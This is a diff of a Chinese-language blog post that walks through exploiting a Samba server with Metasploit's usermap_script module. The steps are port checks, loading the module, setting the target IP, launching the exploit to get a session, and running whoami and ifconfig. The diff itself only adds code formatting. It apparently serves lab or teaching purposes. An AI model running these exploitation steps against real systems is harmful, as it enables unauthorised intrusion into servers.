@@ -12,19 +12,19 @@ tags: samba 提权
 
 #### 过程：
 
-确定目标存在445和139端口开放，使用msf，输入命令search samba
+确定目标存在`445`和`139`端口开放，使用msf，输入命令`search samba`
 
 ![image-20211220184011444](https://gitee.com/oxchang/img-host/raw/master/samba提权/image-20211220184011444.png)
 
-使用命令use exploit/multi/samba/usermap_script，启用漏洞利用模块，终端输入info，查看相关信息
+使用命令`use exploit/multi/samba/usermap_script`，启用漏洞利用模块，终端输入`info`，查看相关信息
 
 ![image-20211220184341512](https://gitee.com/oxchang/img-host/raw/master/samba提权/image-20211220184341512.png)
 
-输入set RHOST ip,设置目标ip地址，输入exploit，开始攻击，攻击成功后，建立会话
+输入`set RHOST ip`,设置目标ip地址，输入`exploit`，开始攻击，攻击成功后，建立会话
 
 ![image-20211220190130652](https://gitee.com/oxchang/img-host/raw/master/samba提权/image-20211220190130652.png)
 
-输入whoami查看权限，输入ifconfig，查看系统网络信息
+输入`whoami`查看权限，输入`ifconfig`，查看系统网络信息
 
 ![image-20211220190258566](https://gitee.com/oxchang/img-host/raw/master/samba提权/image-20211220190258566.png)
 
